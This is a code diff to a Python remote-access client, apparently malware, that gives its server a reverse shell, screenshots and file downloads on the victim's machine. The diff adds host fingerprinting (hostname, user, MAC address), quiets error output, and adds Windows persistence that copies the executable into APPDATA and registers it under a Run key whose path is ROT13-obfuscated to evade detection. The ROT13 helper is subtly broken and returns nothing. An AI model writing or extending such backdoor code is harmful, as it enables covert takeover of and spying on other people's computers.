@@ -1,14 +1,6 @@
-import socket
-import ssl
-import threading
-import sys
-import os
-import subprocess
-import secrets
-import mss
-import mss.tools
-import platform
-
+import socket, ssl, threading, sys, os, subprocess
+import secrets, mss, mss.tools, platform, uuid
+import shutil, winreg, hashlib
 
 class Client:
     def __init__(self, server_address, server_port):
@@ -16,11 +8,16 @@ class Client:
         self.server_port = server_port
         self.secure_sock = None
         self.platform = platform.system()
+        self.hostname = platform.uname()[1]
+        self.user = os.getlogin()
+        self.mac = uuid.getnode()
+        self.uid = self.getClientUID()
         self.commands = {
             'shell': self.reverse_shell,
             'screenshot': self.screenshot,
             'download': self.download
         }
+        self.exe_path = None
     
     def connect(self):
         context = ssl.create_default_context()
@@ -34,7 +31,7 @@ class Client:
             print(f"Connecting to {self.server_address}:{self.server_port}...")
             self.secure_sock.connect((self.server_address, self.server_port))
 
-            information_json = self.infoCollection()
+            information_json = self.getJSONHostInfos()
             self.secure_sock.sendall(information_json.encode())
 
             self.receive_commands()
@@ -66,7 +63,6 @@ class Client:
                     print("Connection closed by the server.")
                     break
             except Exception as e:
-                print(f"Error receiving command: {e}")
                 break
 
     def screenshot(self, args):
@@ -119,13 +115,50 @@ class Client:
             except Exception as e:
                 self.secure_sock.sendall(f"ERROR:\n {str(e)}".encode())
     
-    def infoCollection(self):
-        hostname = platform.uname()[1]
-        user = os.getlogin()
-        
-        return f"{{\"hostname\": \"{hostname}\", \"user\": \"{user}\"}}"
+    def getJSONHostInfos(self):        
+        return f"{{\"hostname\": \"{self.hostname}\", \"user\": \"{self.user}\", \"mac\": \"{self.mac}\", \"uid\": \"{self.uid}\"}}"
 
+    def windowsPersistence(self):
+
+        self.exe_path = os.path.join(os.getenv('APPDATA'), f"{self.uid}.exe")
+
+        # If Persistence is already in place
+        if os.path.exists(self.exe_path):
+            return
+
+        try:
+            shutil.copy2(sys.argv[0], self.exe_path)
+
+        except Exception as e:
+            return
+
+        # Add the exe to startup programs
+        # key name in ROT13 (Software\Microsoft\Windows\CurrentVersion\Run)
+        key_name = r"Fbsgjner\Zvpebfbsg\Jvaqbjf\PheeragIrefvba\Eha"
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                            rot13_decrypt(key_name),
+                            0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "Stryfe", 0, winreg.REG_SZ, self.exe_path)
+        winreg.CloseKey(key)
+
+    def getClientUID(self):
+        string = f"{self.hostname}{self.mac}{self.user}"
+        hostUID = hashlib.sha256(string.encode()).hexdigest()
+        return hostUID[:8]
+
+def rot13_decrypt( text):
+    def shift_char(c):
+        if 'a' <= c <= 'z':
+            return chr((ord(c) - ord('a') + 13) % 26 + ord('a'))
+        elif 'A' <= c <= 'Z':
+            return chr((ord(c) - ord('A') + 13) % 26 + ord('A'))
+        else:
+            return c
+            
+        return ''.join(shift_char(c) for c in text)
 
 if __name__ == "__main__":
     client = Client('127.0.0.1', 8888)
+    if client.platform == 'Windows':
+        client.windowsPersistence()
     client.connect()
